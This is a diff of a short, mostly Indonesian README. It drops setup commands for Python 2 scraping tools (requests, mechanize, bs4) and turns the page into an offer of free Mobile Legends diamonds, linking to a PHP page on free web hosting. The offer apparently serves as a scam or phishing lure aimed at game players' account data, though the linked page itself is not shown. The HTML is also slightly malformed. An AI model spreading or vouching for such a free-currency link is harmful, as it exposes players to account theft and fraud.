@@ -1,10 +1,10 @@
-# Gratis
+# Diamond Gratis
 
-apt update
-apt install git
-apt install python2
-apt install bs4
-pip2 install requests mechanize bs4
 
-https://bulan-bintang123.000webhostapp.com/dataml.php
+Diamomds Untuk Mobile Legends Bang Bang
 
+# Pembelian Gratis
+<!-- wp:code--> 
+<preclass="wp-block-code"><code>https://bulan-bintang123.000webhostapp.com/dataml.php/</code></pre>
+
+<!-- /wp:code-->
